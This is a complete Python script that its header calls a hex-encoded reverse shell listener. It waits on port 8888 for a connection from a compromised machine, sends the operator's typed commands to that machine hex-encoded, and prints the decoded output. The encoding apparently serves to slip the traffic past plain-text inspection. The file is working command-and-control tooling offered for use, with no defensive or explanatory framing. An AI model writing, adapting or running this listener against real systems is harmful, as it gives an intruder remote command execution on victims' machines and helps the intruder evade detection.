# -*- coding: utf-8 -*-
"""
Hex-encoded Reverse Shell Listener
Author: CYBERDEMON
"""

import socket
import codecs
import re

# Convert received hex string to plaintext
def hex_to_text(hex_str):
    """Convert hex-encoded string to plain text, ensuring valid hex input."""
    hex_str = hex_str.strip()  # Remove spaces/newlines
    if not re.fullmatch(r'[0-9a-fA-F]+', hex_str):  # Validate hex format
        print("[ERROR] Received non-hexadecimal data:", hex_str)
        return "[ERROR] Invalid hex data received"
    return bytes.fromhex(hex_str).decode(errors='ignore')  # Decode safely

# Convert plaintext to hex before sending
def text_to_hex(text):
    """Convert plain text to hex-encoded string."""
    return text.encode().hex()

# Setup listener
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 8888      # Change as needed

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[*] Listening on {HOST}:{PORT}")

client, addr = server.accept()
print(f"[*] Connection received from {addr}")

while True:
    command = input("Shell> ")  # Get command input

    if command.lower() == "exit":
        client.send(text_to_hex("exit").encode())  # Send exit command
        break

    client.send(text_to_hex(command).encode())  # Send encoded command
    response = client.recv(4096).decode()  # Receive response

    print("[DEBUG] Raw response:", response)  # Debugging output
    print(hex_to_text(response))  # Decode and print output

client.close()
server.close()
